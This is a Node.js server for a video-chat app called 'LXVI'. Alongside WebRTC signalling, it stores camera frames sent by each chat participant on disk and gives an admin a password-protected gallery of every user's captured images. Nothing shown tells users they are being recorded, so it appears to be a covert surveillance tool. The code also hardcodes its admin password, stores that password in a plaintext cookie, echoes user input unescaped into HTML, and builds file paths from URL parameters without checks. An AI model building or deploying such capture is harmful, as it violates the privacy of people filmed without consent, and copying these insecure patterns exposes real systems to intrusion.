const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" },
  maxHttpBufferSize: 5e6,
});

const PORT = process.env.PORT || 3000;
const CAPTURES_DIR = path.join(__dirname, "captures");
const ADMIN_PASSWORD = "lxvi2024"; // <-- APNA PASSWORD YAHAN BADLO

if (!fs.existsSync(CAPTURES_DIR)) fs.mkdirSync(CAPTURES_DIR, { recursive: true });

app.use(express.static(path.join(__dirname, "public")));

// ─── AUTH MIDDLEWARE ───
function checkAdmin(req, res, next) {
  const auth = req.headers["authorization"];
  const cookie = req.headers["cookie"] || "";
  const hasCookie = cookie.includes(`lxvi_admin=${ADMIN_PASSWORD}`);
  if (hasCookie || (auth && auth === `Bearer ${ADMIN_PASSWORD}`)) return next();

  res.status(401).send(`
    <html><head><title>LXVI Admin</title>
    <style>
      *{margin:0;padding:0;box-sizing:border-box;}
      body{background:#050508;color:#f0f0ff;font-family:'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
      .box{background:#0d0d14;border:1px solid #ffffff18;border-radius:24px;padding:48px;width:360px;text-align:center;box-shadow:0 40px 80px #00000080;}
      .box::before{content:'';display:block;height:1px;background:linear-gradient(90deg,transparent,#7c6dfa,transparent);margin-bottom:32px;}
      h2{font-size:36px;letter-spacing:0.08em;margin-bottom:8px;background:linear-gradient(135deg,#fff,#7c6dfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
      p{color:#5a5480;font-size:13px;margin-bottom:32px;}
      input{width:100%;background:#13131e;border:1px solid #ffffff18;border-radius:12px;padding:14px 16px;color:#f0f0ff;font-size:15px;outline:none;margin-bottom:14px;text-align:center;letter-spacing:0.1em;}
      input:focus{border-color:#7c6dfa;box-shadow:0 0 0 3px #7c6dfa33;}
      button{width:100%;background:linear-gradient(135deg,#7c6dfa,#9b8dff);border:none;border-radius:12px;padding:15px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;}
      button:hover{opacity:0.85;}
      .err{color:#fa4d6d;font-size:13px;margin-top:12px;display:none;}
    </style></head>
    <body><div class="box">
      <h2>LXVI</h2>
      <p>Admin access only</p>
      <input type="password" id="pw" placeholder="Enter password" onkeydown="if(event.key==='Enter')login()"/>
      <button onclick="login()">Enter Panel</button>
      <div class="err" id="err">❌ Wrong password!</div>
      <script>
        function login(){
          const pw=document.getElementById('pw').value;
          document.cookie='lxvi_admin='+pw+';path=/';
          fetch('/admin',{headers:{'Authorization':'Bearer '+pw}})
            .then(r=>{if(r.ok){location.reload();}else{document.getElementById('err').style.display='block';document.cookie='lxvi_admin=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/'}})
            .catch(()=>{document.getElementById('err').style.display='block';});
        }
      </script>
    </div></body></html>
  `);
}

// ─── ADMIN PANEL ───
app.get("/admin", checkAdmin, (req, res) => {
  const roomMap = {};
  Object.values(users).forEach(u => {
    if (!roomMap[u.roomId]) roomMap[u.roomId] = [];
    roomMap[u.roomId].push(u);
  });

  const captureStats = {};
  let totalCaptures = 0;
  if (fs.existsSync(CAPTURES_DIR)) {
    fs.readdirSync(CAPTURES_DIR).forEach(folder => {
      const folderPath = path.join(CAPTURES_DIR, folder);
      if (fs.statSync(folderPath).isDirectory()) {
        const count = fs.readdirSync(folderPath).filter(f => f.endsWith('.jpg')).length;
        captureStats[folder] = count;
        totalCaptures += count;
      }
    });
  }

  const roomsHTML = Object.entries(roomMap).map(([roomId, members]) => `
    <div class="room-card">
      <div class="room-header">
        <span class="room-name">🚪 ${roomId}</span>
        <span class="room-badge">${members.length} online</span>
      </div>
      ${members.map(m => {
        const folderKey = m.name + '_' + m.socketId.slice(0,6);
        const pics = captureStats[folderKey] || 0;
        return `<div class="member">
          <span class="dot"></span>
          <span class="mname">${m.name}</span>
          <span class="mid">${m.socketId.slice(0,8)}...</span>
          <a class="pics-link" href="/admin/gallery/${encodeURIComponent(folderKey)}" target="_blank">📸 ${pics} captures →</a>
        </div>`;
      }).join('')}
    </div>
  `).join('') || '<div class="empty">😴 No active rooms right now</div>';

  res.send(`
    <!DOCTYPE html><html><head><title>LXVI Admin</title>
    <meta http-equiv="refresh" content="5">
    <style>
      *{margin:0;padding:0;box-sizing:border-box;}
      body{background:#050508;color:#f0f0ff;font-family:'Segoe UI',sans-serif;min-height:100vh;}
      .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 32px;background:#0d0d14;border-bottom:1px solid #ffffff0f;}
      .brand{font-size:22px;font-weight:900;letter-spacing:0.1em;background:linear-gradient(135deg,#fff,#7c6dfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
      .refresh-note{font-size:11px;color:#5a5480;}
      .content{padding:32px;}
      .stats{display:flex;gap:16px;margin-bottom:32px;flex-wrap:wrap;}
      .stat{background:#0d0d14;border:1px solid #ffffff0f;border-radius:16px;padding:24px 32px;cursor:default;transition:all 0.2s;}
      .stat.clickable{cursor:pointer;}
      .stat.clickable:hover{border-color:#7c6dfa;transform:translateY(-2px);box-shadow:0 8px 24px #7c6dfa22;}
      .stat-val{font-size:40px;font-weight:800;color:#7c6dfa;line-height:1;}
      .stat.clickable .stat-val{color:#fa6d8f;}
      .stat-label{font-size:12px;color:#5a5480;margin-top:6px;text-transform:uppercase;letter-spacing:0.1em;}
      .stat.clickable .stat-label{color:#fa6d8f99;}
      .section-title{font-size:11px;color:#5a5480;text-transform:uppercase;letter-spacing:0.12em;margin-bottom:16px;font-weight:700;}
      .room-card{background:#0d0d14;border:1px solid #ffffff0f;border-radius:16px;padding:20px;margin-bottom:12px;}
      .room-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;}
      .room-name{font-size:16px;font-weight:700;}
      .room-badge{background:#7c6dfa22;color:#7c6dfa;padding:4px 14px;border-radius:99px;font-size:12px;font-weight:600;}
      .member{display:flex;align-items:center;gap:12px;padding:10px 0;border-top:1px solid #ffffff08;font-size:13px;}
      .dot{width:8px;height:8px;background:#6dfacc;border-radius:50%;box-shadow:0 0 8px #6dfacc;flex-shrink:0;}
      .mname{font-weight:600;min-width:100px;}
      .mid{color:#5a5480;flex:1;font-family:monospace;font-size:12px;}
      .pics-link{color:#fa6d8f;text-decoration:none;font-size:12px;background:#fa6d8f12;border:1px solid #fa6d8f33;padding:4px 12px;border-radius:8px;transition:all 0.15s;white-space:nowrap;}
      .pics-link:hover{background:#fa6d8f22;border-color:#fa6d8f66;}
      .empty{color:#5a5480;text-align:center;padding:48px;font-size:14px;}
    </style></head>
    <body>
      <div class="topbar">
        <div class="brand">LXVI ADMIN</div>
        <div class="refresh-note">⟳ Auto-refresh every 5s</div>
      </div>
      <div class="content">
        <div class="stats">
          <div class="stat">
            <div class="stat-val">${Object.keys(roomMap).length}</div>
            <div class="stat-label">Active Rooms</div>
          </div>
          <div class="stat">
            <div class="stat-val">${Object.keys(users).length}</div>
            <div class="stat-label">Users Online</div>
          </div>
          <div class="stat clickable" onclick="window.open('/admin/gallery','_blank')" title="Click to view all captures">
            <div class="stat-val">${totalCaptures}</div>
            <div class="stat-label">Total Captures 🖼️ Click to View</div>
          </div>
        </div>
        <div class="section-title">Live Rooms</div>
        ${roomsHTML}
      </div>
    </body></html>
  `);
});

// ─── GALLERY — ALL USERS ───
app.get("/admin/gallery", checkAdmin, (req, res) => {
  const folders = [];
  if (fs.existsSync(CAPTURES_DIR)) {
    fs.readdirSync(CAPTURES_DIR).forEach(folder => {
      const fp = path.join(CAPTURES_DIR, folder);
      if (fs.statSync(fp).isDirectory()) {
        const files = fs.readdirSync(fp).filter(f => f.endsWith('.jpg')).sort().reverse();
        folders.push({ name: folder, count: files.length, latest: files[0] || null });
      }
    });
  }

  const foldersHTML = folders.length === 0
    ? '<div class="empty">📭 Koi captures nahi abhi tak</div>'
    : folders.map(f => `
      <a class="user-card" href="/admin/gallery/${encodeURIComponent(f.name)}">
        <div class="user-thumb">
          ${f.latest ? `<img src="/admin/img/${encodeURIComponent(f.name)}/${encodeURIComponent(f.latest)}" onerror="this.style.display='none'"/>` : '<div class="no-img">📷</div>'}
        </div>
        <div class="user-info">
          <div class="user-name">${f.name.split('_')[0]}</div>
          <div class="user-count">${f.count} captures</div>
        </div>
      </a>
    `).join('');

  res.send(`
    <!DOCTYPE html><html><head><title>LXVI Gallery</title>
    <style>
      *{margin:0;padding:0;box-sizing:border-box;}
      body{background:#050508;color:#f0f0ff;font-family:'Segoe UI',sans-serif;min-height:100vh;}
      .topbar{display:flex;align-items:center;gap:16px;padding:16px 32px;background:#0d0d14;border-bottom:1px solid #ffffff0f;}
      .back{color:#7c6dfa;text-decoration:none;font-size:13px;border:1px solid #7c6dfa44;padding:6px 14px;border-radius:8px;}
      .back:hover{background:#7c6dfa22;}
      .title{font-size:18px;font-weight:800;letter-spacing:0.06em;}
      .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;padding:32px;}
      .user-card{background:#0d0d14;border:1px solid #ffffff0f;border-radius:16px;overflow:hidden;cursor:pointer;text-decoration:none;color:#f0f0ff;transition:all 0.2s;display:block;}
      .user-card:hover{border-color:#fa6d8f;transform:translateY(-3px);box-shadow:0 12px 32px #fa6d8f22;}
      .user-thumb{height:160px;background:#13131e;display:flex;align-items:center;justify-content:center;overflow:hidden;}
      .user-thumb img{width:100%;height:100%;object-fit:cover;}
      .no-img{font-size:40px;}
      .user-info{padding:14px 16px;}
      .user-name{font-size:15px;font-weight:700;margin-bottom:4px;}
      .user-count{font-size:12px;color:#fa6d8f;}
      .empty{color:#5a5480;text-align:center;padding:80px;font-size:16px;}
    </style></head>
    <body>
      <div class="topbar">
        <a class="back" href="/admin">← Back</a>
        <div class="title">📸 All Captures</div>
      </div>
      <div class="grid">${foldersHTML}</div>
    </body></html>
  `);
});

// ─── GALLERY — SINGLE USER ───
app.get("/admin/gallery/:folder", checkAdmin, (req, res) => {
  const folder = decodeURIComponent(req.params.folder);
  const folderPath = path.join(CAPTURES_DIR, folder);

  if (!fs.existsSync(folderPath)) return res.status(404).send("Folder not found");

  const files = fs.readdirSync(folderPath).filter(f => f.endsWith('.jpg')).sort().reverse();
  const userName = folder.split('_')[0];

  const imgsHTML = files.length === 0
    ? '<div class="empty">📭 Koi captures nahi</div>'
    : files.map((f, i) => {
        const ts = f.replace('frame_','').replace('.jpg','').replace(/T/,' ').replace(/-/g,':').slice(0,19);
        return `
          <div class="img-card" onclick="openModal(${i})">
            <img src="/admin/img/${encodeURIComponent(folder)}/${encodeURIComponent(f)}" loading="lazy"/>
            <div class="img-time">${ts}</div>
          </div>`;
      }).join('');

  const allSrcs = JSON.stringify(files.map(f => `/admin/img/${encodeURIComponent(folder)}/${encodeURIComponent(f)}`));

  res.send(`
    <!DOCTYPE html><html><head><title>${userName} — Captures</title>
    <style>
      *{margin:0;padding:0;box-sizing:border-box;}
      body{background:#050508;color:#f0f0ff;font-family:'Segoe UI',sans-serif;min-height:100vh;}
      .topbar{display:flex;align-items:center;gap:16px;padding:16px 32px;background:#0d0d14;border-bottom:1px solid #ffffff0f;}
      .back{color:#7c6dfa;text-decoration:none;font-size:13px;border:1px solid #7c6dfa44;padding:6px 14px;border-radius:8px;}
      .back:hover{background:#7c6dfa22;}
      .title{font-size:18px;font-weight:800;}
      .count{font-size:12px;color:#5a5480;margin-left:auto;}
      .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;padding:24px;}
      .img-card{background:#0d0d14;border:1px solid #ffffff0f;border-radius:12px;overflow:hidden;cursor:pointer;transition:all 0.2s;}
      .img-card:hover{border-color:#7c6dfa;transform:scale(1.02);}
      .img-card img{width:100%;height:140px;object-fit:cover;display:block;}
      .img-time{font-size:10px;color:#5a5480;padding:7px 10px;font-family:monospace;}
      .empty{color:#5a5480;text-align:center;padding:80px;}
      /* Modal */
      #modal{display:none;position:fixed;inset:0;background:#000000ee;z-index:999;align-items:center;justify-content:center;flex-direction:column;}
      #modal.open{display:flex;}
      #modal img{max-width:90vw;max-height:80vh;border-radius:12px;object-fit:contain;}
      .modal-nav{display:flex;gap:24px;margin-top:20px;align-items:center;}
      .nav-btn{background:#0d0d14;border:1px solid #ffffff18;border-radius:10px;padding:10px 24px;color:#f0f0ff;cursor:pointer;font-size:18px;}
      .nav-btn:hover{background:#13131e;}
      .modal-close{position:fixed;top:20px;right:24px;background:#fa4d6d;border:none;border-radius:10px;padding:8px 18px;color:#fff;cursor:pointer;font-size:14px;font-weight:700;}
      .modal-info{color:#5a5480;font-size:12px;margin-top:8px;font-family:monospace;}
    </style></head>
    <body>
      <div class="topbar">
        <a class="back" href="/admin/gallery">← All Users</a>
        <div class="title">📸 ${userName}</div>
        <div class="count">${files.length} captures</div>
      </div>
      <div class="grid">${imgsHTML}</div>

      <div id="modal">
        <button class="modal-close" onclick="closeModal()">✕ Close</button>
        <img id="modal-img" src=""/>
        <div class="modal-info" id="modal-info"></div>
        <div class="modal-nav">
          <button class="nav-btn" onclick="prevImg()">‹ Prev</button>
          <span id="modal-counter" style="color:#5a5480;font-size:13px;"></span>
          <button class="nav-btn" onclick="nextImg()">Next ›</button>
        </div>
      </div>

      <script>
        const srcs = ${allSrcs};
        let cur = 0;
        function openModal(i){ cur=i; updateModal(); document.getElementById('modal').classList.add('open'); }
        function closeModal(){ document.getElementById('modal').classList.remove('open'); }
        function nextImg(){ cur=(cur+1)%srcs.length; updateModal(); }
        function prevImg(){ cur=(cur-1+srcs.length)%srcs.length; updateModal(); }
        function updateModal(){
          document.getElementById('modal-img').src=srcs[cur];
          document.getElementById('modal-counter').textContent=(cur+1)+' / '+srcs.length;
          document.getElementById('modal-info').textContent=srcs[cur].split('/').pop().replace('%3A',':');
        }
        document.getElementById('modal').addEventListener('click', e=>{ if(e.target===document.getElementById('modal')) closeModal(); });
        document.addEventListener('keydown', e=>{ if(e.key==='ArrowRight') nextImg(); if(e.key==='ArrowLeft') prevImg(); if(e.key==='Escape') closeModal(); });
      </script>
    </body></html>
  `);
});

// ─── SERVE INDIVIDUAL IMAGES ───
app.get("/admin/img/:folder/:file", checkAdmin, (req, res) => {
  const folder = decodeURIComponent(req.params.folder);
  const file = decodeURIComponent(req.params.file);
  const filePath = path.join(CAPTURES_DIR, folder, file);
  if (!fs.existsSync(filePath)) return res.status(404).send("Not found");
  res.sendFile(filePath);
});

// ─── ROOMS API ───
app.get("/rooms", (req, res) => {
  const roomMap = {};
  Object.values(users).forEach(u => {
    if (!roomMap[u.roomId]) roomMap[u.roomId] = 0;
    roomMap[u.roomId]++;
  });
  res.json(roomMap);
});

// ─── SOCKET ───
const users = {};

io.on("connection", (socket) => {
  console.log(`\n🟢 Connected: ${socket.id}`);

  socket.on("join", ({ name, roomId }) => {
    users[socket.id] = { name, roomId, socketId: socket.id };
    socket.join(roomId);
    const userDir = path.join(CAPTURES_DIR, `${name}_${socket.id.slice(0, 6)}`);
    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    users[socket.id].captureDir = userDir;
    console.log(`👤 ${name} joined room: ${roomId}`);
    socket.to(roomId).emit("user-joined", { socketId: socket.id, name });
    const existingUsers = Object.values(users)
      .filter(u => u.roomId === roomId && u.socketId !== socket.id)
      .map(u => ({ socketId: u.socketId, name: u.name }));
    socket.emit("existing-users", existingUsers);
    broadcastUserList(roomId);
  });

  socket.on("offer", ({ to, offer }) => socket.to(to).emit("offer", { from: socket.id, offer }));
  socket.on("answer", ({ to, answer }) => socket.to(to).emit("answer", { from: socket.id, answer }));
  socket.on("ice-candidate", ({ to, candidate }) => socket.to(to).emit("ice-candidate", { from: socket.id, candidate }));

  socket.on("frame", ({ frameData }) => {
    const user = users[socket.id];
    if (!user || !user.captureDir) return;
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const filepath = path.join(user.captureDir, `frame_${timestamp}.jpg`);
    const base64Data = frameData.replace(/^data:image\/jpeg;base64,/, "");
    fs.writeFile(filepath, base64Data, "base64", () => {
      process.stdout.write(`📸 ${user.name} → ${timestamp}\r`);
    });
  });

  socket.on("disconnect", () => {
    const user = users[socket.id];
    if (user) {
      console.log(`\n🔴 ${user.name} left`);
      socket.to(user.roomId).emit("user-left", { socketId: socket.id });
      const roomId = user.roomId;
      delete users[socket.id];
      broadcastUserList(roomId);
    }
  });
});

function broadcastUserList(roomId) {
  const roomUsers = Object.values(users)
    .filter(u => u.roomId === roomId)
    .map(u => ({ socketId: u.socketId, name: u.name }));
  io.to(roomId).emit("user-list", roomUsers);
}

server.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════╗
║   ⚡  LXVI Server Running!               ║
╠══════════════════════════════════════════╣
║  App:    http://localhost:${PORT}             ║
║  Admin:  http://localhost:${PORT}/admin       ║
║  Pass:   ${ADMIN_PASSWORD}                      ║
╚══════════════════════════════════════════╝
`);
});
